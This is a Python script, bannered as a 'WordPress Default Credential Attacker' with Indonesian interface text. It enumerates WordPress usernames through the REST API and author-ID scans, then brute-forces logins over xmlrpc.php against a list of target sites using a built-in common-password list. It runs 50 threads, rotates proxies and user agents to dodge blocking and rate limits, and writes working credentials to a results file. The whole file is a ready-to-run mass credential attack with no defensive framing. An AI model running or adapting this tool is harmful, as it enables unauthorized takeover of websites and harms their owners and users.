import requests
import re
import time
import random
import logging
import argparse
import xml.etree.ElementTree as ET
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
from multiprocessing import Lock
from urllib.parse import urlparse
from pathlib import Path

init(autoreset=True)

write_lock = Lock()

logging.basicConfig(
    filename='wpdefault.log',
    level=logging.INFO,
    format='%(asctime)s %(levelname)s %(message)s'
)

DEFAULT_PASSWORDS = [
    'admin', 'pass', 'user', 'administrator', 'demo', 'test', 'qwerty', 'root',
    'Admin@123', 'admin@123', 'admin123', 'Admin', 'Admin11@', 'admin@123#',
    'adminPass', 'Admin@123#', 'Password@123', 'admin2024', 'admin@2024',
    'admin1234', 'admin2023', 'admin2025', 'admin2021', 'admin2022', 'admin2019',
    'admin2018', 'admincobain', 'admintest', 'adminbiasa', 'admin456', 'adminftp',
    'admin1212', 'admin1313', 'admin1414', 'admin1515', 'admin1616', 'admin1717',
    'admin1818', 'admin1919', 'admin2020', 'adminwordpres', 'adminaja', 'admin1',
    'admin2', 'admin3', 'admin4', 'admin5', 'adminroot', 'admin2026', 'admin2027',
    'administrator123', 'administrator1234', 'webadmin', 'admin@2024', 'wpadmin',
    'adminwp', 'ADMIN2020', 'ADMIN2021', 'ADMIN2022', 'ADMIN2023', 'ADMIN2024',
    'ADMIN2025', 'ADMIN2026', 'ADMIN2027', 'admintest123', 'admin@12345',
    'adminqwerty', 'p@ssw0rd@12345', 'admin1453', 'test123#', 'test123',
    'Qwerty@123', 'admin33527', 'admin383937', 'admin27483', 'admin99372',
    'p@ssw0rd', 'p@ssw0rd123', '123456', '12345678', 'password', 'password1',
    'password123', '1234567890', 'iloveyou', 'sunshine', 'princess', 'welcome',
    'shadow', 'superman', 'michael', 'football', 'charlie', 'donald', 'aa123456',
    'letmein', 'monkey', 'master', 'login', 'hello', '123456789', 'dragon',
    'passw0rd', 'abc123', 'starwars', 'whatever', 'trustno1', 'pass123',
    'welcome1', 'admin!', 'admin!@#', 'wordpress', 'Wordpress1', 'WordPress1',
    'wp-admin', 'wpadmin123', 'Admin1234', 'admin_123', 'admin.123',
]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
]

SKIP_SIGNS = ['Archive', 'Archives', 'Author', 'Home', ',', ';', '\\']


def get_random_ua():
    return random.choice(USER_AGENTS)


def is_valid_url(url):
    try:
        parsed = urlparse(url)
        return parsed.scheme in ('http', 'https') and bool(parsed.netloc) and '.' in parsed.netloc
    except Exception:
        return False


def normalize_url(url):
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url.rstrip('/')


def load_proxies(filepath='proxies.txt'):
    p = Path(filepath)
    if not p.exists():
        return []
    proxies = []
    for line in p.read_text().splitlines():
        line = line.strip()
        if not line:
            continue
        if not line.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            line = 'http://' + line
        proxies.append({'http': line, 'https': line})
    return proxies


def get_proxy(proxies):
    if not proxies:
        return None
    return random.choice(proxies)


def read_url_list(filename):
    try:
        with open(filename, 'r', errors='ignore') as f:
            lines = [normalize_url(l.strip()) for l in f if l.strip()]
            return [u for u in lines if is_valid_url(u)]
    except FileNotFoundError:
        print(Fore.RED + f'File tidak ditemukan: {filename}')
        return []


def load_password_file(filepath):
    p = Path(filepath)
    if not p.exists():
        return []
    return [l.strip() for l in p.read_text().splitlines() if l.strip()]


def make_session(proxy=None):
    s = requests.Session()
    s.headers.update({'User-Agent': get_random_ua()})
    if proxy:
        s.proxies.update(proxy)
    return s


def check_xmlrpc_enabled(url, session, timeout=10):
    try:
        r = session.get(url + '/xmlrpc.php', timeout=timeout, allow_redirects=True)
        if r.status_code in (200, 405):
            return True
        return False
    except Exception:
        return False


def parse_xmlrpc_success(response_text):
    try:
        root = ET.fromstring(response_text)
        fault = root.find('.//fault')
        if fault is not None:
            return False
        blog_name = root.find('.//{http://wordpress.org/XML-RPC}blogName')
        if blog_name is not None:
            return True
        for elem in root.iter():
            if elem.tag == 'name' and elem.text == 'blogName':
                return True
            if elem.text and 'blogName' in (elem.text or ''):
                return True
        members = root.findall('.//member')
        for m in members:
            name_el = m.find('name')
            if name_el is not None and name_el.text == 'blogName':
                return True
        return False
    except ET.ParseError:
        return 'blogName' in response_text and 'faultCode' not in response_text


def xmlrpc_attempt(url, username, password, session, timeout=12):
    xml_payload = (
        '<?xml version="1.0"?>'
        '<methodCall>'
        '<methodName>wp.getUsersBlogs</methodName>'
        '<params>'
        '<param><value><string>{}</string></value></param>'
        '<param><value><string>{}</string></value></param>'
        '</params>'
        '</methodCall>'
    ).format(username.replace('&', '&amp;').replace('<', '&lt;'),
             password.replace('&', '&amp;').replace('<', '&lt;'))

    headers = {
        'Content-Type': 'text/xml',
        'User-Agent': get_random_ua(),
    }

    r = session.post(
        url + '/xmlrpc.php',
        data=xml_payload,
        headers=headers,
        timeout=timeout,
        allow_redirects=False,
    )
    return r


def handle_rate_limit(status_code, retry_count):
    if status_code in (429, 503):
        wait = min(2 ** retry_count + random.uniform(1, 3), 60)
        time.sleep(wait)
        return True
    return False


def get_usernames_rest(url, session, timeout=15):
    usernames = []
    try:
        endpoints = [
            '/wp-json/wp/v2/users?per_page=100',
            '/wp-json/wp/v2/users',
        ]
        for ep in endpoints:
            try:
                r = session.get(url + ep, timeout=timeout, allow_redirects=True)
                if r.status_code == 200:
                    try:
                        users = r.json()
                        if isinstance(users, list):
                            for user in users:
                                for key in ['slug', 'name', 'username', 'author']:
                                    if key in user and user[key]:
                                        val = str(user[key]).strip()
                                        if val and not any(s in val for s in SKIP_SIGNS):
                                            usernames.append(val)
                                        break
                            if usernames:
                                break
                    except Exception:
                        pass
            except Exception:
                continue
    except Exception as e:
        logging.error(f'REST enum error {url}: {e}')
    return list(dict.fromkeys(usernames))


def get_usernames_author_scan(url, session, timeout=10, max_id=5):
    usernames = []
    try:
        for i in range(1, max_id + 1):
            try:
                r = session.get(
                    url + f'/?author={i}',
                    timeout=timeout,
                    allow_redirects=True,
                )
                if r.status_code == 200:
                    match = re.search(r'/author/([^/"<>\s]+)', r.url + ' ' + r.text)
                    if match:
                        uname = match.group(1).strip()
                        if uname and not any(s in uname for s in SKIP_SIGNS):
                            if uname not in usernames:
                                usernames.append(uname)
            except Exception:
                continue
    except Exception as e:
        logging.error(f'Author scan error {url}: {e}')
    return usernames


def get_all_usernames(url, session):
    found = get_usernames_rest(url, session)
    if not found:
        found = get_usernames_author_scan(url, session)
    if not found:
        found = ['admin']
    return found


def save_result(url, username, password):
    line = f'{url}/wp-login.php#{username}@{password}\n'
    with write_lock:
        with open('result.txt', 'a', encoding='utf-8') as f:
            f.write(line)
    logging.info(f'SUCCESS {url} {username}:{password}')


def bruteforce(url, passwords, proxies, delay_range, verify_ssl, timeout):
    try:
        proxy = get_proxy(proxies)
        session = make_session(proxy)
        session.verify = verify_ssl

        if not check_xmlrpc_enabled(url, session, timeout=timeout):
            print(Fore.YELLOW + f'[XMLRPC OFF] : {url}')
            logging.info(f'XMLRPC disabled: {url}')
            return False

        usernames = get_all_usernames(url, session)
        print(Fore.CYAN + f'[USERS] {url} => {usernames}')

        for username in usernames:
            if any(s in username for s in SKIP_SIGNS):
                continue

            pwlist = passwords if passwords else DEFAULT_PASSWORDS
            extra = [username, username + '123', username + '@123',
                     username + '2024', username + '2025', username + '1234']
            full_list = list(dict.fromkeys(extra + pwlist))

            retry_count = 0
            for password in full_list:
                try:
                    proxy = get_proxy(proxies)
                    if proxy:
                        session.proxies.update(proxy)
                    session.headers.update({'User-Agent': get_random_ua()})

                    r = xmlrpc_attempt(url, username, password, session, timeout=timeout)

                    if r.status_code in (429, 503):
                        handle_rate_limit(r.status_code, retry_count)
                        retry_count += 1
                        r = xmlrpc_attempt(url, username, password, session, timeout=timeout)

                    if r.status_code == 403:
                        print(Fore.YELLOW + f'[BLOCKED 403] : {url} — IP mungkin diblock')
                        logging.warning(f'403 blocked: {url}')
                        time.sleep(random.uniform(5, 15))
                        continue

                    retry_count = 0

                    if parse_xmlrpc_success(r.text):
                        print(Fore.GREEN + f'[SUCCESS] : {url} | {username} : {password}')
                        save_result(url, username, password)
                        return True
                    else:
                        print(Fore.RED + f'[FAILED] : {url} | {username} : {password}')

                    dmin, dmax = delay_range
                    time.sleep(random.uniform(dmin, dmax))

                except requests.exceptions.Timeout:
                    logging.warning(f'Timeout: {url} {username}:{password}')
                    print(Fore.YELLOW + f'[TIMEOUT] : {url}')
                    continue
                except requests.exceptions.SSLError:
                    logging.warning(f'SSL error: {url}')
                    session.verify = False
                    continue
                except requests.exceptions.ConnectionError:
                    logging.warning(f'Connection error: {url}')
                    time.sleep(random.uniform(2, 5))
                    continue
                except requests.exceptions.RequestException as e:
                    logging.error(f'Request error {url}: {e}')
                    continue

    except Exception as e:
        logging.error(f'Fatal error {url}: {e}')
        print(Fore.RED + f'[ERROR] : {url} — {e}')

    return False


def main():
    parser = argparse.ArgumentParser(description='WordPress Default Credential Attacker')
    parser.add_argument('-l', '--list', required=True, help='File daftar URL target (.txt)')
    parser.add_argument('-p', '--passwords', default=None, help='File wordlist password custom (.txt)')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Jumlah thread (default: 50)')
    parser.add_argument('--proxies', default='proxies.txt', help='File daftar proxy (opsional)')
    parser.add_argument('--delay-min', type=float, default=0.5, help='Delay minimum antar request (detik)')
    parser.add_argument('--delay-max', type=float, default=2.0, help='Delay maksimum antar request (detik)')
    parser.add_argument('--timeout', type=int, default=12, help='Timeout request (detik)')
    parser.add_argument('--no-verify-ssl', action='store_true', help='Skip verifikasi SSL')
    args = parser.parse_args()

    print(Fore.CYAN + Style.BRIGHT + '=' * 50)
    print(Fore.CYAN + Style.BRIGHT + '   WORDPRESS DEFAULT ATTACK')
    print(Fore.CYAN + Style.BRIGHT + '   Author : @x')
    print(Fore.CYAN + Style.BRIGHT + '=' * 50)

    urls = read_url_list(args.list)
    if not urls:
        print(Fore.RED + 'Tidak ada URL valid dalam file.')
        return

    passwords = load_password_file(args.passwords) if args.passwords else []
    proxies = load_proxies(args.proxies)
    delay_range = (args.delay_min, args.delay_max)
    verify_ssl = not args.no_verify_ssl

    print(Fore.CYAN + f'Target   : {len(urls)} URL')
    print(Fore.CYAN + f'Threads  : {args.threads}')
    print(Fore.CYAN + f'Proxies  : {len(proxies)} loaded')
    print(Fore.CYAN + f'Wordlist : {"custom (" + str(len(passwords)) + ")" if passwords else "default (" + str(len(DEFAULT_PASSWORDS)) + ")"}')
    print(Fore.CYAN + f'Delay    : {delay_range[0]}s – {delay_range[1]}s')
    print()

    success_count = 0
    fail_count = 0

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {
            executor.submit(bruteforce, url, passwords, proxies, delay_range, verify_ssl, args.timeout): url
            for url in urls
        }
        for future in as_completed(futures):
            url = futures[future]
            try:
                result = future.result()
                if result:
                    success_count += 1
                else:
                    fail_count += 1
            except Exception as e:
                logging.error(f'Future error {url}: {e}')
                fail_count += 1

    print()
    print(Fore.CYAN + '=' * 50)
    print(Fore.GREEN + f'Berhasil : {success_count}')
    print(Fore.RED + f'Gagal    : {fail_count}')
    print(Fore.CYAN + f'Log      : wpdefault.log')
    print(Fore.CYAN + f'Hasil    : result.txt')
    print(Fore.CYAN + '=' * 50)


if __name__ == '__main__':
    main()
